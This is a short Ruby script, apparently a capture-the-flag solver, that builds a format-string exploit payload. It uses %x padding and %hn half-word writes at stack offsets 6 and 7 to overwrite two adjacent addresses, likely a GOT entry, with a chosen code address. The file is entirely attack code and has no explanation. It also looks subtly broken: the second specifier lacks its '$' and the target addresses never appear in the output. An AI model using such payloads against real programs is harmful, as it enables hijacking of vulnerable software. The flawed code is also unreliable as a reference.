#!/usr/bin/env ruby

src = 0x8048691

pos = 6
dest1 = 0x080499fc
dest2 = dest1+0x4

value1 = 34441
value2 = 33139

((34441+8+33139)%0x10000).to_s 16
"%#{value1}x%#{pos}$hn" + "%#{value2}x%#{pos+1}hn" + "\n"
